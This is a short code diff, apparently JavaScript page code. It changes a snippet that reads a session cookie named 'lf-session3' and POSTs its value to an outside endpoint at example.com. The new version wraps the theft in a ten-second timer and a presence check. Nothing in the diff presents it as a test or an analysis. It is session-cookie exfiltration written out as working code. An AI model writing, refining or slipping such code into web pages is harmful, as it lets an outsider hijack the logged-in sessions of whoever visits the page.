@@ -6,21 +6,20 @@
 
 
 
-const allCookies = document.cookie;
-const session = document.cookie
-  .split('; ')
-  .find(row => row.startsWith('lf-session3'))
-  ?.split('=')[1];
+setTimeout(() => {
+  const session = document.cookie
+    .split('; ')
+    .find(row => row.startsWith('lf-session3'))
+    ?.split('=')[1];
 
-fetch('https://example.com/api/items', {
-  method: 'POST',
-  headers: {
-    'Content-Type': 'application/json'
-  },
-  body: session
-})
-  
-
+  if (session) {
+    fetch('https://example.com/api/items', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: session
+    });
+  }
+}, 10000);
 
 
 
